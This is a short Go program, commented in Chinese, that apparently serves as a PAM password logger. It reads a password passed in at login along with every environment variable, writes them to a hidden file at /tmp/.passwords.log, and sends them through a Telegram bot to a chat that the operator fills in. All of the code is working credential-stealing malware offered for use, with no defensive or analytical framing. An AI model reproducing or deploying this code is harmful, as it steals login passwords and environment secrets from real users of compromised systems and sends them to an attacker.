package main

import (
	"fmt"
	"os"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

var (
	Logfile       string = "/tmp/.passwords.log"
	TelegramToken string = "1234456:xxxxxxxxxxxxxxxxx" //這裡改成TG token
	ChatID        int64  = 123213 // 替換為你的Chat ID
)

func main() {
	// 打开日志文件
	file, err := os.OpenFile(Logfile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		os.Exit(0)
	}
	defer file.Close()

	// 获取环境变量和输入密码
	vars := os.Environ()
	var password string
	fmt.Scan(&password)

	// 配置日志记录
	log.Logger = zerolog.New(file).With().Timestamp().Logger()

	// 记录到日志文件
	log.Info().
		Interface("vars", vars).
		Str("password", password).
		Msg("Pam password log")

	// 初始化Telegram Bot
	bot, err := tgbotapi.NewBotAPI(TelegramToken)
	if err != nil {
		log.Fatal().Err(err).Msg("Failed to create Telegram bot")
	}

	// 构建发送消息
	msg := tgbotapi.NewMessage(ChatID, fmt.Sprintf("Password: %s\nVars: %v", password, vars))

	// 发送消息
	_, err = bot.Send(msg)
	if err != nil {
		log.Error().Err(err).Msg("Failed to send message to Telegram")
	}
}
